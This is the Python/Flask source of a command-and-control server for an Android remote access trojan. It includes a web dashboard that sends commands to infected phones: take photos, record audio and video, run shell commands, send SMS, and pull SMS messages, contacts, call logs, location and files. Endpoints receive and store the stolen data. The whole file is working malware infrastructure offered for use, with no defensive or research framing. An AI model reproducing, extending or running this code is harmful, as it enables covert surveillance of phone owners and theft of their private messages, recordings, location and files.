#!/usr/bin/env python3
"""
Android RAT - Command & Control Server
Usage: python3 server.py
Access: http://localhost:5000
"""

from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import os
import json
import base64
from datetime import datetime
from pathlib import Path
import threading

app = Flask(__name__)
CORS(app)

# Data storage
DEVICES = {}  # {device_id: {info, last_seen, data}}
COMMANDS = {}  # {device_id: [commands]}
UPLOADS = Path("uploads")
UPLOADS.mkdir(exist_ok=True)

# Lock for thread safety
data_lock = threading.Lock()

@app.route('/')
def dashboard():
    """Web dashboard"""
    return '''
<!DOCTYPE html>
<html>
<head>
    <title>Android RAT Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #1a1a2e; color: #eee; }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        h1 { color: #00d9ff; margin-bottom: 20px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
        .card { background: #16213e; border-radius: 10px; padding: 20px; border: 1px solid #0f3460; }
        .card h3 { color: #00d9ff; margin-bottom: 15px; }
        .device-item { background: #0f3460; padding: 15px; margin: 10px 0; border-radius: 5px; }
        .device-item:hover { background: #1a4a7a; cursor: pointer; }
        .device-info { font-size: 12px; color: #aaa; }
        .btn { background: #00d9ff; color: #000; border: none; padding: 8px 15px; 
               border-radius: 5px; cursor: pointer; margin: 5px; }
        .btn:hover { background: #00b8d4; }
        .btn-danger { background: #e94560; color: #fff; }
        .btn-success { background: #0f0; color: #000; }
        .command-panel { display: none; margin-top: 20px; }
        .command-panel.active { display: block; }
        select, input { padding: 10px; border-radius: 5px; border: 1px solid #0f3460; 
                        background: #16213e; color: #fff; width: 200px; margin: 5px; }
        .data-view { background: #0a0a15; padding: 15px; border-radius: 5px; 
                     max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 12px; }
        .status { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 5px; }
        .online { background: #0f0; }
        .offline { background: #f00; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #0f3460; }
        th { color: #00d9ff; }
        .log-entry { padding: 5px; border-bottom: 1px solid #0f3460; }
        .log-time { color: #888; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎯 Android RAT Dashboard</h1>
        
        <div class="grid">
            <div class="card">
                <h3>📱 Connected Devices</h3>
                <div id="devices"></div>
            </div>
            
            <div class="card">
                <h3>📊 Statistics</h3>
                <p>Total Devices: <strong id="total-devices">0</strong></p>
                <p>Online: <strong id="online-devices">0</strong></p>
                <p>Photos: <strong id="total-photos">0</strong></p>
                <p>Audio Files: <strong id="total-audio">0</strong></p>
            </div>
            
            <div class="card">
                <h3>📋 Recent Activity</h3>
                <div id="activity" class="data-view"></div>
            </div>
        </div>
        
        <div id="command-panel" class="card command-panel">
            <h3>⚡ Send Command</h3>
            <select id="command-type">
                <option value="camera">📷 Take Photo</option>
                <option value="camera_video">🎥 Record Video</option>
                <option value="call_logs">📞 Get Call Logs</option>
                <option value="files">📁 List Files</option>
                <option value="location">📍 Get Location</option>
                <option value="sms">📨 Get SMS</option>
                <option value="contacts">👥 Get Contacts</option>
                <option value="audio">🎤 Record Audio</option>
                <option value="info">ℹ️ Device Info</option>
                <option value="shell">🔧 Shell Command</option>
                <option value="sms_send">📤 Send SMS</option>
            </select>
            <input type="text" id="command-param" placeholder="Parameter (path/number/etc)">
            <button class="btn btn-success" onclick="sendCommand()">Send Command</button>
        </div>
        
        <div id="data-panel" class="card command-panel">
            <h3>📄 Device Data</h3>
            <div id="device-data" class="data-view"></div>
        </div>
    </div>
    
    <script>
        let selectedDevice = null;
        
        function refresh() {
            fetch('/api/devices')
                .then(r => r.json())
                .then(data => {
                    const devicesDiv = document.getElementById('devices');
                    devicesDiv.innerHTML = '';
                    
                    let online = 0;
                    Object.keys(data).forEach(deviceId => {
                        const device = data[deviceId];
                        const isOnline = Date.now() - device.last_seen < 60000;
                        if (isOnline) online++;
                        
                        devicesDiv.innerHTML += `
                            <div class="device-item" onclick="selectDevice('${deviceId}')">
                                <div><span class="status ${isOnline ? 'online' : 'offline'}"></span>
                                     ${device.deviceInfo?.model || deviceId}</div>
                                <div class="device-info">
                                    ${device.deviceInfo?.androidVersion || ''} | 
                                    Last: ${new Date(device.last_seen).toLocaleString()}
                                </div>
                            </div>
                        `;
                    });
                    
                    document.getElementById('total-devices').textContent = Object.keys(data).length;
                    document.getElementById('online-devices').textContent = online;
                });
            
            fetch('/api/stats')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('total-photos').textContent = data.photos || 0;
                    document.getElementById('total-audio').textContent = data.audio || 0;
                });
            
            fetch('/api/activity')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('activity').innerHTML = data.slice(0, 20).map(log => 
                        `<div class="log-entry"><span class="log-time">${log.time}</span> ${log.message}</div>`
                    ).join('');
                });
        }
        
        function selectDevice(deviceId) {
            selectedDevice = deviceId;
            document.getElementById('command-panel').classList.add('active');
            document.getElementById('data-panel').classList.add('active');
            
            fetch(`/api/device/${deviceId}`)
                .then(r => r.json())
                .then(data => {
                    document.getElementById('device-data').innerHTML = 
                        '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
                });
        }
        
        function sendCommand() {
            const type = document.getElementById('command-type').value;
            const param = document.getElementById('command-param').value;
            
            let command = { action: type };
            if (type === 'files' || type === 'download') command.path = param;
            if (type === 'audio') command.duration = 60;
            if (type === 'sms_send') {
                command.number = param.split(',')[0];
                command.message = param.split(',')[1];
            }
            if (type === 'shell') command.command = param;
            
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ deviceId: selectedDevice, command })
            })
            .then(r => r.json())
            .then(data => {
                alert('Command sent!');
                refresh();
            });
        }
        
        setInterval(refresh, 5000);
        refresh();
    </script>
</body>
</html>
    '''

# ========== API ENDPOINTS ==========

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    """Device heartbeat"""
    data = request.json
    device_id = data.get('deviceId')
    
    with data_lock:
        if device_id not in DEVICES:
            DEVICES[device_id] = {'commands': [], 'data': {}}
        DEVICES[device_id]['last_seen'] = datetime.now().timestamp()
        DEVICES[device_id]['deviceInfo'] = json.loads(data.get('deviceInfo', '{}'))
    
    log_activity(f"📱 Heartbeat from {device_id}")
    return jsonify({'status': 'ok'})

@app.route('/api/commands/<device_id>', methods=['GET'])
def get_commands(device_id):
    """Get pending commands for device"""
    with data_lock:
        if device_id not in DEVICES:
            return jsonify([])
        commands = DEVICES[device_id].get('commands', [])
        DEVICES[device_id]['commands'] = []  # Clear after sending
        return jsonify(commands)

@app.route('/api/command', methods=['POST'])
def send_command():
    """Send command to device"""
    data = request.json
    device_id = data.get('deviceId')
    command = data.get('command')
    
    with data_lock:
        if device_id not in DEVICES:
            DEVICES[device_id] = {'commands': [], 'data': {}}
        if 'commands' not in DEVICES[device_id]:
            DEVICES[device_id]['commands'] = []
        DEVICES[device_id]['commands'].append(command)
    
    log_activity(f"⚡ Command sent to {device_id}: {command.get('action')}")
    return jsonify({'status': 'ok'})

@app.route('/api/photo', methods=['POST'])
def receive_photo():
    """Receive photo notification"""
    data = request.json
    device_id = data.get('deviceId')
    log_activity(f"📷 Photo taken by {device_id}")
    return jsonify({'status': 'ok'})

@app.route('/api/upload/photo/<device_id>', methods=['POST'])
def upload_photo(device_id):
    """Upload photo file"""
    data = request.json
    filename = data.get('filename')
    file_data = base64.b64decode(data.get('data'))
    
    photo_dir = UPLOADS / 'photos' / device_id
    photo_dir.mkdir(parents=True, exist_ok=True)
    
    filepath = photo_dir / filename
    filepath.write_bytes(file_data)
    
    with data_lock:
        if device_id not in DEVICES:
            DEVICES[device_id] = {'data': {}}
        if 'photos' not in DEVICES[device_id]['data']:
            DEVICES[device_id]['data']['photos'] = []
        DEVICES[device_id]['data']['photos'].append({
            'filename': filename,
            'path': str(filepath),
            'timestamp': datetime.now().isoformat()
        })
    
    log_activity(f"📷 Photo uploaded from {device_id}: {filename}")
    return jsonify({'status': 'ok'})

@app.route('/api/call_logs', methods=['POST'])
def receive_call_logs():
    """Receive call logs"""
    data = request.json
    device_id = data.get('deviceId')
    
    with data_lock:
        if device_id not in DEVICES:
            DEVICES[device_id] = {'data': {}}
        DEVICES[device_id]['data']['call_logs'] = data.get('logs', [])
    
    log_activity(f"📞 Call logs received from {device_id}")
    return jsonify({'status': 'ok'})

@app.route('/api/files', methods=['POST'])
def receive_files():
    """Receive file listing"""
    data = request.json
    device_id = data.get('deviceId')
    
    with data_lock:
        if device_id not in DEVICES:
            DEVICES[device_id] = {'data': {}}
        if 'file_system' not in DEVICES[device_id]['data']:
            DEVICES[device_id]['data']['file_system'] = {}
        DEVICES[device_id]['data']['file_system'][data.get('path')] = data.get('files', [])
    
    log_activity(f"📁 File listing from {device_id}: {data.get('path')}")
    return jsonify({'status': 'ok'})

@app.route('/api/upload/file/<device_id>', methods=['POST'])
def upload_file(device_id):
    """Upload file"""
    data = request.json
    filename = data.get('filename')
    file_data = base64.b64decode(data.get('data'))
    
    file_dir = UPLOADS / 'files' / device_id
    file_dir.mkdir(parents=True, exist_ok=True)
    
    filepath = file_dir / filename
    filepath.write_bytes(file_data)
    
    log_activity(f"📁 File uploaded from {device_id}: {filename}")
    return jsonify({'status': 'ok'})

@app.route('/api/location', methods=['POST'])
def receive_location():
    """Receive location"""
    data = request.json
    device_id = data.get('deviceId')
    
    with data_lock:
        if device_id not in DEVICES:
            DEVICES[device_id] = {'data': {}}
        DEVICES[device_id]['data']['location'] = {
            'latitude': data.get('latitude'),
            'longitude': data.get('longitude'),
            'provider': data.get('provider'),
            'timestamp': datetime.now().isoformat()
        }
    
    log_activity(f"📍 Location from {device_id}: {data.get('latitude')}, {data.get('longitude')}")
    return jsonify({'status': 'ok'})

@app.route('/api/sms', methods=['POST'])
def receive_sms():
    """Receive SMS"""
    data = request.json
    device_id = data.get('deviceId')
    
    with data_lock:
        if device_id not in DEVICES:
            DEVICES[device_id] = {'data': {}}
        DEVICES[device_id]['data']['sms'] = data.get('sms', [])
    
    log_activity(f"📨 SMS received from {device_id}")
    return jsonify({'status': 'ok'})

@app.route('/api/sms_sent', methods=['POST'])
def receive_sms_sent():
    """Receive SMS sent confirmation"""
    data = request.json
    device_id = data.get('deviceId')
    log_activity(f"📤 SMS sent from {device_id} to {data.get('number')}")
    return jsonify({'status': 'ok'})

@app.route('/api/contacts', methods=['POST'])
def receive_contacts():
    """Receive contacts"""
    data = request.json
    device_id = data.get('deviceId')
    
    with data_lock:
        if device_id not in DEVICES:
            DEVICES[device_id] = {'data': {}}
        DEVICES[device_id]['data']['contacts'] = data.get('contacts', [])
    
    log_activity(f"👥 Contacts received from {device_id}")
    return jsonify({'status': 'ok'})

@app.route('/api/audio', methods=['POST'])
def receive_audio():
    """Receive audio notification"""
    data = request.json
    device_id = data.get('deviceId')
    log_activity(f"🎤 Audio recorded by {device_id}")
    return jsonify({'status': 'ok'})

@app.route('/api/upload/audio/<device_id>', methods=['POST'])
def upload_audio(device_id):
    """Upload audio file"""
    data = request.json
    filename = data.get('filename')
    file_data = base64.b64decode(data.get('data'))
    
    audio_dir = UPLOADS / 'audio' / device_id
    audio_dir.mkdir(parents=True, exist_ok=True)
    
    filepath = audio_dir / filename
    filepath.write_bytes(file_data)
    
    with data_lock:
        if device_id not in DEVICES:
            DEVICES[device_id] = {'data': {}}
        if 'audio' not in DEVICES[device_id]['data']:
            DEVICES[device_id]['data']['audio'] = []
        DEVICES[device_id]['data']['audio'].append({
            'filename': filename,
            'path': str(filepath),
            'timestamp': datetime.now().isoformat()
        })
    
    log_activity(f"🎤 Audio uploaded from {device_id}: {filename}")
    return jsonify({'status': 'ok'})

@app.route('/api/device_info', methods=['POST'])
def receive_device_info():
    """Receive device info"""
    data = request.json
    device_id = data.get('deviceId')
    
    with data_lock:
        if device_id not in DEVICES:
            DEVICES[device_id] = {'data': {}}
        DEVICES[device_id]['data']['device_info'] = data.get('info', {})
    
    log_activity(f"ℹ️ Device info from {device_id}")
    return jsonify({'status': 'ok'})

# ========== ADMIN API ==========

@app.route('/api/devices', methods=['GET'])
def get_devices():
    """Get all devices"""
    with data_lock:
        return jsonify({k: {'last_seen': v.get('last_seen'), 'deviceInfo': v.get('deviceInfo')} 
                       for k, v in DEVICES.items()})

@app.route('/api/device/<device_id>', methods=['GET'])
def get_device(device_id):
    """Get device data"""
    with data_lock:
        if device_id in DEVICES:
            return jsonify(DEVICES[device_id])
        return jsonify({}), 404

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """Get statistics"""
    with data_lock:
        photos = sum(len(d.get('data', {}).get('photos', [])) for d in DEVICES.values())
        audio = sum(len(d.get('data', {}).get('audio', [])) for d in DEVICES.values())
        return jsonify({'photos': photos, 'audio': audio})

@app.route('/api/activity', methods=['GET'])
def get_activity():
    """Get activity log"""
    return jsonify(ACTIVITY_LOG)

@app.route('/api/download/<type>/<device_id>/<filename>')
def download_file(type, device_id, filename):
    """Download uploaded file"""
    filepath = UPLOADS / type / device_id / filename
    if filepath.exists():
        return send_file(filepath, as_attachment=True)
    return 'File not found', 404

# ========== ACTIVITY LOG ==========

ACTIVITY_LOG = []

def log_activity(message):
    """Log activity"""
    entry = {
        'time': datetime.now().strftime('%H:%M:%S'),
        'message': message
    }
    ACTIVITY_LOG.insert(0, entry)
    if len(ACTIVITY_LOG) > 100:
        ACTIVITY_LOG.pop()

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════╗
    ║     Android RAT - Command & Control Server       ║
    ╠══════════════════════════════════════════════════╣
    ║  Dashboard: http://localhost:5000                ║
    ║  API Base:    http://localhost:5000/api          ║
    ╚══════════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=5000, debug=False)
